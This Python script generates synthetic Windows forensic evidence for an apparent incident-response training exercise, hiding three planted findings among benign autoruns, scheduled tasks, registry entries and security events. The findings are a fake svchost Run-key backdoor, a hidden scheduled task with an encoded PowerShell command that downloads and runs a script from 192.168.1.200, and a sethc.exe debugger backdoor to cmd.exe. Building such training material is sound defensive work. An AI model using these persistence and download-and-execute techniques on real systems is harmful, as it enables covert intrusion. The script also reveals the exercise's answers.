#!/usr/bin/env python3
"""One-time maintainer script: regenerates the four evidence files in this
directory with realistic volume/noise around the three planted findings.
Deterministic (fixed seed) so re-running reproduces the same output.
Run from this directory: python3 generate_evidence.py
"""
import random

random.seed(1802)

# ---------------------------------------------------------------- autoruns
AUTORUNS_HEADER = "Entry Location,Entry,Enabled,Category,Profile,Description,Publisher,Image Path,Timestamp"

# (location, entry, category, description, publisher, path)
LEGIT_AUTORUNS = [
    ("HKLM\\...\\Run", "OneDrive", "Logon", "Microsoft OneDrive", "Microsoft Corporation", r"C:\Program Files\Microsoft OneDrive\OneDrive.exe"),
    ("HKLM\\...\\Run", "SecurityHealth", "Logon", "Windows Security notification icon", "Microsoft Windows", r"C:\Windows\System32\SecurityHealthSystray.exe"),
    ("HKLM\\...\\Run", "NvBackend", "Logon", "NVIDIA GeForce Experience", "NVIDIA Corporation", r"C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerLocalSystem.exe"),
    ("HKLM\\...\\Run", "Dropbox", "Logon", "Dropbox desktop sync client", "Dropbox Inc", r"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe"),
    ("HKLM\\...\\Run", "com.squirrel.Teams.Teams", "Logon", "Microsoft Teams", "Microsoft Corporation", r"C:\Users\jsmith\AppData\Local\Microsoft\Teams\current\Teams.exe"),
    ("HKLM\\...\\Run", "SlackAutoLaunch", "Logon", "Slack desktop client", "Slack Technologies, Inc.", r"C:\Users\jsmith\AppData\Local\slack\slack.exe"),
    ("HKLM\\...\\Run", "ZoomUMX", "Logon", "Zoom Meetings", "Zoom Video Communications, Inc.", r"C:\Users\jsmith\AppData\Roaming\Zoom\bin\Zoom.exe"),
    ("HKLM\\...\\Run", "jusched", "Logon", "Java Update Scheduler", "Oracle Corporation", r"C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe"),
    ("HKLM\\...\\Run", "IntelAudioService", "Logon", "Intel(R) Smart Sound Technology", "Intel Corporation", r"C:\Windows\System32\IntelAudioService.exe"),
    ("HKLM\\...\\Run", "igfxTray", "Logon", "Intel(R) Graphics Tray", "Intel Corporation", r"C:\Windows\System32\igfxTray.exe"),
    ("HKLM\\...\\Run", "DellSupportAssistAgent", "Logon", "Dell SupportAssist Agent", "Dell Inc.", r"C:\Program Files\Dell\SupportAssistAgent\SupportAssistAgent.exe"),
    ("HKLM\\...\\Run", "Dell Command | Update", "Logon", "Dell Command Update", "Dell Inc.", r"C:\Program Files (x86)\Dell\CommandUpdate\DellCommandUpdate.exe"),
    ("HKLM\\...\\Run", "AcroCEF32", "Logon", "Adobe Acrobat helper process", "Adobe Inc.", r"C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat\AcroCEF\RdrCEF.exe"),
    ("HKLM\\...\\Run", "CCleanerSkipUAC", "Logon", "CCleaner update helper", "Piriform Software Ltd", r"C:\Program Files\CCleaner\CCleaner64.exe"),
    ("Scheduled Tasks", "GoogleUpdateTaskMachineCore", "Task Scheduler", "Keeps Google software up to date", "Google LLC", r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"),
    ("Scheduled Tasks", "GoogleUpdateTaskMachineUA", "Task Scheduler", "Keeps Google software up to date", "Google LLC", r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"),
    ("Scheduled Tasks", "OneDrive Standalone Update Task", "Task Scheduler", "Updates OneDrive", "Microsoft Corporation", r"C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"),
    ("Scheduled Tasks", "Adobe Acrobat Update Task", "Task Scheduler", "Adobe Acrobat updater", "Adobe Inc.", r"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"),
    ("Scheduled Tasks", "MicrosoftEdgeUpdateTaskMachineCore", "Task Scheduler", "Keeps Microsoft Edge up to date", "Microsoft Corporation", r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"),
    ("Scheduled Tasks", "NvTmRep_CrashReport1", "Task Scheduler", "NVIDIA crash reporter", "NVIDIA Corporation", r"C:\Program Files\NVIDIA Corporation\NvTelemetry\NvTmRep.exe"),
    ("Services", "RealtekAudioService", "Boot Execute", "Realtek Audio Universal Service", "Realtek Semiconductor", r"C:\Windows\System32\RtkAudUService64.exe"),
    ("Services", "WdNisSvc", "Boot Execute", "Windows Defender Antivirus Network Inspection Service", "Microsoft Windows", r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24070.5\NisSrv.exe"),
    ("Services", "CSFalconService", "Boot Execute", "CrowdStrike Falcon Sensor Service", "CrowdStrike, Inc.", r"C:\Windows\System32\drivers\CrowdStrike\CSFalconService.exe"),
    ("Services", "VeeamEndpointBackupSvc", "Boot Execute", "Veeam Agent for Microsoft Windows", "Veeam Software Group GmbH", r"C:\Program Files\Veeam\Endpoint Backup\Veeam.EndpointBackup.Service.exe"),
    ("Services", "AGSService", "Boot Execute", "Adobe Genuine Software Integrity Service", "Adobe Inc.", r"C:\Program Files (x86)\Common Files\Adobe\AdobeGCClient\AGSService.exe"),
    ("Services", "CitrixWorkspaceUpdater", "Boot Execute", "Citrix Workspace update service", "Citrix Systems, Inc.", r"C:\Program Files (x86)\Citrix\ICA Client\CitrixWorkspaceUpdater.exe"),
    ("Services", "AMDEventUtility", "Boot Execute", "AMD External Events Utility", "Advanced Micro Devices, Inc.", r"C:\Windows\System32\atiesrxx.exe"),
    ("Services", "HPWMISvc", "Boot Execute", "HP WMI Interface Service", "HP Inc.", r"C:\Program Files (x86)\Hewlett-Packard\HP Support Framework\HPWmiSvc.exe"),
    ("HKLM\\...\\Winlogon\\Notify", "GPClient", "Boot Execute", "Group Policy Client-Side Extension", "Microsoft Corporation", r"C:\Windows\System32\gpclient.dll"),
    ("Codecs", "MSVideo", "Codec", "Microsoft Video Codec", "Microsoft Corporation", r"C:\Windows\System32\msyuv.dll"),
    ("Internet Explorer\\Toolbar", "Adobe PDF Link Helper", "Browser Helper Object", "Adobe Acrobat PDF link helper", "Adobe Inc.", r"C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat\AcroIEFavClient.dll"),
    ("Internet Explorer\\Toolbar", "Skype for Business Browser Helper", "Browser Helper Object", "Skype for Business click-to-call add-in", "Microsoft Corporation", r"C:\Program Files\Microsoft Office\root\Office16\OFFICE365\ADDINS\Skype.dll"),
    ("HKLM\\...\\Explorer\\ShellIconOverlayIdentifiers", "DropboxExt", "Explorer", "Dropbox shell icon overlay", "Dropbox Inc", r"C:\Program Files (x86)\Dropbox\Client\DropboxExt64.20.dll"),
    ("Printers", "Canon IJ Network Scan Utility", "Logon", "Canon scanner network utility", "Canon Inc.", r"C:\Program Files\Canon\IJ Network Scanner Selector EX\CNMNSST.exe"),
    ("Printers", "EEventManager", "Logon", "Epson Event Manager", "Seiko Epson Corporation", r"C:\Program Files (x86)\EPSON Software\Event Manager\EEventManager.exe"),
]

AUG_TIMESTAMPS = ["2026-08-01 09:14:0{}".format(i) for i in range(1, 8)] + \
                 ["2026-08-02 10:0{}:1{}".format(i % 10, i) for i in range(1, 8)] + \
                 ["2026-08-03 14:0{}:4{}".format(i % 10, i) for i in range(1, 8)] + \
                 ["2026-08-05 11:1{}:2{}".format(i % 10, i) for i in range(1, 8)]

# A few additional, entirely legitimate September installs/updates so the
# malicious row's month isn't the only outlier in the file.
SEPT_DECOYS = [
    ("HKLM\\...\\Run", "MicrosoftEdgeAutoLaunch", "Logon", "Microsoft Edge background launch", "Microsoft Corporation", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "2026-09-03 08:22:10"),
    ("Services", "SentinelAgent", "Boot Execute", "SentinelOne endpoint agent (new deployment)", "SentinelOne, Inc.", r"C:\Program Files\SentinelOne\Sentinel Agent\SentinelAgent.exe", "2026-09-09 13:05:44"),
    ("Scheduled Tasks", "Adobe Genuine Monitor", "Task Scheduler", "Adobe Genuine Software monitor", "Adobe Inc.", r"C:\Program Files (x86)\Common Files\Adobe\OOBE\PDApp\UWA\Adobe Genuine Monitor.exe", "2026-09-12 07:30:00"),
]


PROFILE_USERS = ["jsmith", "mgarcia", "twong"]


def gen_autoruns():
    rows = [AUTORUNS_HEADER]
    ts_pool = list(AUG_TIMESTAMPS) * 3
    random.shuffle(ts_pool)
    ts_i = 0

    def next_ts():
        nonlocal ts_i
        v = ts_pool[ts_i % len(ts_pool)]
        ts_i += 1
        return v

    for loc, entry, cat, desc, pub, path in LEGIT_AUTORUNS:
        rows.append(f"{loc},{entry},Enabled,{cat},System,{desc},(Verified) {pub},{path},{next_ts()}")
        # Real per-user startup apps (not system services/drivers) also show
        # up once per Windows profile that has them installed - multiplies
        # the realistic Logon-category volume without hand-authoring more.
        if cat == "Logon" and loc.startswith("HKLM\\...\\Run"):
            for user in PROFILE_USERS:
                user_path = path.replace("C:\\Users\\jsmith\\", f"C:\\Users\\{user}\\")
                rows.append(f"HKCU\\...\\Run,{entry},Enabled,{cat},{user},{desc},(Verified) {pub},{user_path},{next_ts()}")
    for loc, entry, cat, desc, pub, path, ts in SEPT_DECOYS:
        rows.append(f"{loc},{entry},Enabled,{cat},System,{desc},(Verified) {pub},{path},{ts}")
    # the planted backdoor - unchanged
    rows.append("HKLM\\...\\Run,WinUpdateHelper,Enabled,Logon,System,Windows Update Helper,(Not verified) Unknown,C:\\ProgramData\\Microsoft\\svchost.exe,2026-09-12 03:41:57")
    return "\n".join(rows) + "\n"


# ------------------------------------------------------------ sched tasks
def P(path):
    """A Windows TaskPath ending in a backslash, without tripping Python's
    raw-string-can't-end-in-backslash rule."""
    return path + "\\"


LEGIT_TASKS = [
    (P(r"\Microsoft\Windows\WindowsUpdate"), "Scheduled Start", "2026-09-12 06:00:03", "2026-09-13 06:00:00", "Microsoft Corporation", r"%windir%\system32\usoclient.exe StartScan", "Daily at 6:00 AM"),
    (P(r"\Microsoft\Windows\WindowsUpdate"), "Reboot", "2026-09-10 03:00:01", "N/A", "Microsoft Corporation", r"%windir%\system32\shutdown.exe /r /f", "At sign in"),
    (r"\GoogleUpdateTaskMachineCore", "GoogleUpdateTaskMachineCore", "2026-09-12 01:12:44", "2026-09-13 01:12:44", "Google LLC", r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /c', "Daily at 1:12 AM"),
    (r"\GoogleUpdateTaskMachineUA", "GoogleUpdateTaskMachineUA", "2026-09-12 05:12:44", "2026-09-12 10:12:44", "", r'"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua', "Repeats every 5 hours indefinitely, starting 2026-09-01 00:00:00"),
    (P(r"\Microsoft\Windows\OfficeSoftwareProtectionPlatform"), "SvcRestartTask", "2026-09-12 04:00:00", "2026-09-13 04:00:00", "Microsoft Corporation", r"sc.exe start osppsvc", "Daily at 4:00 AM"),
    (P(r"\Microsoft\OneDrive"), "OneDrive Standalone Update Task-S-1-5-21", "2026-09-11 22:30:00", "2026-09-12 22:30:00", "", r'"C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"', "Daily at 10:30 PM"),
    (P(r"\Microsoft\Windows\Diagnosis"), "Scheduled", "2026-09-12 05:00:00", "2026-09-13 05:00:00", "Microsoft Corporation", r"%windir%\system32\DeviceCensus.exe", "Daily at 5:00 AM"),
    (P(r"\Microsoft\Windows\Maintenance"), "WinSAT", "2026-09-11 02:00:00", "N/A", "Microsoft Corporation", r"%windir%\system32\winsat.exe formal", "On idle"),
    (P(r"\Microsoft\Windows\DiskCleanup"), "SilentCleanup", "2026-09-05 03:00:00", "N/A", "Microsoft Corporation", r"%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%", "On idle"),
    (P(r"\Microsoft\Windows\Application Experience"), "Microsoft Compatibility Appraiser", "2026-09-12 04:16:00", "2026-09-13 04:16:00", "Microsoft Corporation", r"%windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun", "Daily at 4:16 AM"),
    (P(r"\Microsoft\Windows\Application Experience"), "ProgramDataUpdater", "2026-09-11 12:00:00", "N/A", "Microsoft Corporation", r"%windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun", "At sign in"),
    (P(r"\Microsoft\Windows\Customer Experience Improvement Program"), "Consolidator", "2026-09-05 03:00:00", "2026-09-19 03:00:00", "Microsoft Corporation", r"%windir%\system32\wsqmcons.exe", "Weekly on Sunday at 3:00 AM"),
    (P(r"\Microsoft\Windows\Customer Experience Improvement Program"), "UsbCeip", "2026-09-12 07:00:00", "2026-09-13 07:00:00", "Microsoft Corporation", r"%windir%\system32\rundll32.exe USBCEIP.DLL,USBCEIPFireUp", "Daily at 7:00 AM"),
    (P(r"\Microsoft\Windows\NetTrace"), "GatherNetworkInfo", "2026-09-12 08:47:00", "2026-09-12 09:02:00", "Microsoft Corporation", r"%windir%\system32\netsh.exe trace stop", "Repeats every 15 minutes indefinitely, starting 2026-09-01 00:00:00"),
    (P(r"\Microsoft\Windows\Time Synchronization"), "SynchronizeTime", "2026-09-12 01:00:00", "2026-09-13 01:00:00", "Microsoft Corporation", r"%windir%\system32\sc.exe start w32time task_started", "Daily at 1:00 AM"),
    (P(r"\Microsoft\Windows\Defrag"), "ScheduledDefrag", "2026-09-08 01:00:00", "2026-09-15 01:00:00", "Microsoft Corporation", r"%windir%\system32\defrag.exe -c -h -o", "Weekly on Wednesday at 1:00 AM"),
    (P(r"\Microsoft\Windows\Chkdsk"), "ProactiveScan", "2026-09-01 02:00:00", "N/A", "Microsoft Corporation", r"%windir%\system32\chkdsk.exe /proactivescan", "On idle"),
    (P(r"\Microsoft\Windows\Windows Error Reporting"), "QueueReporting", "2026-09-12 09:10:00", "N/A", "Microsoft Corporation", r"%windir%\system32\wermgr.exe -upload", "On event"),
    (P(r"\Microsoft\Windows\WindowsColorSystem"), "Calibration Loader", "2026-09-12 06:00:00", "2026-09-13 06:00:00", "Microsoft Corporation", r"%windir%\system32\dccw.exe -profile", "At sign in"),
    (r"\Adobe Acrobat Update Task", "Adobe Acrobat Update Task", "2026-09-12 06:15:00", "2026-09-13 06:15:00", "Adobe Inc.", r'"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"', "Daily at 6:15 AM"),
    (r"\Adobe Genuine Monitor", "Adobe Genuine Monitor", "2026-09-12 07:30:05", "2026-09-12 19:30:05", "", r'"C:\Program Files (x86)\Common Files\Adobe\OOBE\PDApp\UWA\Adobe Genuine Monitor.exe"', "Repeats every 12 hours indefinitely, starting 2026-09-09 00:00:00"),
    (r"\Dropbox Update Task-S-1-5-21", "Dropbox Update Task-S-1-5-21", "2026-09-12 03:00:00", "2026-09-13 03:00:00", "", r'"C:\Program Files (x86)\Dropbox\Update\DropboxUpdate.exe" /c', "Daily at 3:00 AM"),
    (r"\NvTmRep_CrashReport1_S-1-5-21", "NvTmRep_CrashReport1_S-1-5-21", "2026-09-10 16:44:00", "N/A", "NVIDIA Corporation", r'"C:\Program Files\NVIDIA Corporation\NvTelemetry\NvTmRep.exe"', "On event"),
    (r"\NVIDIA GeForce Experience SelfUpdate", "SelfUpdate", "2026-09-12 02:00:00", "2026-09-13 02:00:00", "NVIDIA Corporation", r'"C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerLocalSystem.exe" -update', "Daily at 2:00 AM"),
    (r"\MicrosoftEdgeUpdateTaskMachineCore", "MicrosoftEdgeUpdateTaskMachineCore", "2026-09-12 03:41:00", "2026-09-13 03:41:00", "Microsoft Corporation", r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c', "Daily at 3:41 AM"),
    (r"\MicrosoftEdgeUpdateTaskMachineUA", "MicrosoftEdgeUpdateTaskMachineUA", "2026-09-12 05:41:00", "2026-09-12 11:41:00", "", r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua', "Repeats every 6 hours indefinitely, starting 2026-09-01 00:00:00"),
    (r"\CCleanerSkipUAC", "CCleanerSkipUAC", "2026-09-11 20:00:00", "N/A", "Piriform Software Ltd", r'"C:\Program Files\CCleaner\CCleaner64.exe" /MONITOR', "At sign in"),
    (r"\Zoom Updater", "Zoom Updater", "2026-09-12 04:00:00", "2026-09-13 04:00:00", "Zoom Video Communications, Inc.", r'"C:\Users\jsmith\AppData\Roaming\Zoom\bin\Zoom.exe" /update', "Daily at 4:00 AM"),
    (r"\CrowdStrike\Falcon Quick Scan", "Falcon Quick Scan", "2026-09-12 05:30:00", "2026-09-13 05:30:00", "CrowdStrike, Inc.", r'"C:\Windows\System32\drivers\CrowdStrike\CSFalconService.exe" -quickscan', "Daily at 5:30 AM"),
]

MALICIOUS_TASK = (P(r"\Microsoft\Windows\SystemHealth"), "Telemetry", "2026-09-12 08:47:19", "2026-09-12 09:17:19", "",
                   "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAGEALgBwAHMAMQAnACkA",
                   "Repeats every 30 minutes indefinitely, starting 2026-09-12 06:00:00")


def gen_scheduled_tasks():
    lines = ["PS C:\\> Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Get-ScheduledTaskInfo | Format-List", ""]
    tasks = list(LEGIT_TASKS)
    # insert the malicious task in the middle of the list, not first/last
    insert_at = len(tasks) // 2
    tasks.insert(insert_at, MALICIOUS_TASK)
    for path, name, last_run, next_run, author, action, trigger in tasks:
        lines.append(f"TaskPath          : {path}")
        lines.append(f"TaskName          : {name}")
        lines.append(f"LastRunTime       : {last_run}")
        lines.append(f"NextRunTime       : {next_run}")
        lines.append(f"Author            : {author}")
        lines.append(f"Actions           : {action}")
        lines.append(f"Triggers          : {trigger}")
        lines.append("LastTaskResult    : 0")
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"


# ------------------------------------------------------------- IFEO regs
LEGIT_IFEO = [
    ("AcroRd32.exe", 'CompatibilityFlags"=dword:00000100', None),
    ("vpnclient_x64.exe", None, "hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00"),
    ("OldSetup.exe", 'CompatibilityFlags"=dword:00000200', None, "WIN7RTM"),
    ("reportingsvc.exe", None, "hex:00,00,00,00,01,00,00,00,00,00,00,00,00,00,00,00"),
    ("acad.exe", 'CompatibilityFlags"=dword:00000400', None, "WIN8RTM"),
    ("SAPgui.exe", 'CompatibilityFlags"=dword:00000100', None),
    ("posclient.exe", None, "hex:00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,00"),
    ("OUTLOOK.EXE", None, "hex:00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00"),
    ("iexplore.exe", 'CompatibilityFlags"=dword:00000800', None, "WIN8RTM"),
    ("java.exe", None, "hex:00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00"),
    ("LegacyPayroll.exe", 'CompatibilityFlags"=dword:00000200', None, "WINXPSP3"),
    ("printclient32.exe", 'CompatibilityFlags"=dword:00000100', None),
    ("scanmgr.exe", None, "hex:00,00,00,00,00,01,00,00,00,00,00,00,00,00,00,00"),
    ("kiosk_launcher.exe", None, "hex:00,00,00,00,00,00,01,00,00,00,00,00,00,00,00,00"),
]


def gen_ifeo():
    lines = [
        "Windows Registry Editor Version 5.00",
        "",
        "; Exported from HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        '; via: reg export "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" ifeo_export.reg',
        "",
        "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options]",
        "",
    ]
    entries = list(LEGIT_IFEO)
    # insert the planted debugger entry in the middle, unchanged
    insert_at = len(entries) // 2
    entries = entries[:insert_at] + [("sethc.exe", 'Debugger"="C:\\\\Windows\\\\System32\\\\cmd.exe"', None)] + entries[insert_at:]
    for entry in entries:
        exe = entry[0]
        val1 = entry[1]
        val2 = entry[2]
        layer = entry[3] if len(entry) > 3 else None
        lines.append(f"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{exe}]")
        if val1:
            lines.append(f'"{val1}')
        if val2:
            lines.append(f'"MitigationOptions"={val2}')
        if layer:
            lines.append(f'"LayerName"="{layer}"')
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"


# ------------------------------------------------------ security events
ACCOUNTS = ["jsmith", "administrator", "svc-backup", "svc-monitor", "mgarcia", "twong", "helpdesk", "svc-reports"]
LOGON_TYPES = [2, 3, 5, 10]
PROC_NOISE = [
    (r"C:\Windows\System32\RtkAudUService64.exe", r"C:\Windows\System32\services.exe"),
    (r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", r"C:\Windows\explorer.exe"),
    (r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe", r"C:\Windows\System32\svchost.exe"),
    (r"C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerLocalSystem.exe", r"C:\Windows\System32\services.exe"),
    (r"C:\Windows\System32\WerFault.exe", r"C:\Windows\System32\svchost.exe"),
    (r"C:\Program Files\Dell\SupportAssistAgent\SupportAssistAgent.exe", r"C:\Windows\System32\services.exe"),
]


def _rand_time(hour, minute_lo=0, minute_hi=59):
    m = random.randint(minute_lo, minute_hi)
    s = random.randint(0, 59)
    return hour, m, s


def gen_security_events():
    rows = ["TimeCreated,Id,ProviderName,Message"]
    events = []  # (hour, minute, second, line)

    def add(h, m, s, line):
        events.append((h, m, s, line))

    # baseline noise across the business day (07:00-19:00), light overnight
    for h in list(range(6, 22)):
        n = random.randint(16, 28) if 7 <= h <= 18 else random.randint(3, 8)
        for _ in range(n):
            _, m, s = _rand_time(h)
            kind = random.choice(["logon", "logoff", "priv", "proc", "failed"])
            acct = random.choice(ACCOUNTS)
            if kind == "logon":
                lt = random.choice(LOGON_TYPES)
                add(h, m, s, f"An account was successfully logged on. Account: {acct} Logon Type: {lt}")
            elif kind == "logoff":
                add(h, m, s, f"An account was logged off. Account: {acct}")
            elif kind == "priv":
                add(h, m, s, f"Special privileges assigned to new logon. Account: {acct}")
            elif kind == "proc":
                new_p, creator = random.choice(PROC_NOISE)
                add(h, m, s, f"A new process has been created. New Process Name: {new_p} Creator Process Name: {creator}")
            else:
                add(h, m, s, f"An account failed to log on. Account: {acct} Logon Type: {random.choice(LOGON_TYPES)} Failure Reason: Unknown user name or bad password")

    # the planted chain - exact timestamps and text unchanged
    add(9, 41, 52, "An RDP logon attempt reached the Winlogon secure desktop. Account: -")
    add(9, 41, 58, r"A new process has been created. New Process Name: C:\Windows\System32\cmd.exe Creator Process Name: C:\Windows\System32\sethc.exe Creator Process ID: 0x8ac")
    add(9, 42, 31, r"A new process has been created. New Process Name: C:\ProgramData\Microsoft\svchost.exe Creator Process Name: C:\Windows\System32\cmd.exe")

    # a little extra realistic density right around 09:4x so the hint's
    # "grep 09:4" filter still returns a small-but-real slice, not just 3 lines
    for m in (40, 43, 45, 47, 48):
        _, mm, s = _rand_time(9, m, m)
        acct = random.choice(ACCOUNTS)
        add(9, mm, s, f"An account was successfully logged on. Account: {acct} Logon Type: {random.choice(LOGON_TYPES)}")

    events.sort(key=lambda e: (e[0], e[1], e[2]))
    date = "2026-09-12"
    for h, m, s, line in events:
        rows.append(f"{date} {h:02d}:{m:02d}:{s:02d},4624,Microsoft-Windows-Security-Auditing,{line}"
                     if "successfully logged on" in line else
                     f"{date} {h:02d}:{m:02d}:{s:02d},{_event_id(line)},Microsoft-Windows-Security-Auditing,{line}")
    return "\n".join(rows) + "\n"


def _event_id(line: str) -> str:
    if "successfully logged on" in line:
        return "4624"
    if "logged off" in line:
        return "4634"
    if "Special privileges" in line:
        return "4672"
    if "new process has been created" in line:
        return "4688"
    if "failed to log on" in line:
        return "4625"
    if "secure desktop" in line:
        return "4624"
    return "4624"


if __name__ == "__main__":
    with open("autoruns.csv", "w") as f:
        f.write(gen_autoruns())
    with open("scheduled_tasks.txt", "w") as f:
        f.write(gen_scheduled_tasks())
    with open("ifeo_registry.txt", "w") as f:
        f.write(gen_ifeo())
    with open("security_events.csv", "w") as f:
        f.write(gen_security_events())
    print("wrote autoruns.csv, scheduled_tasks.txt, ifeo_registry.txt, security_events.csv")
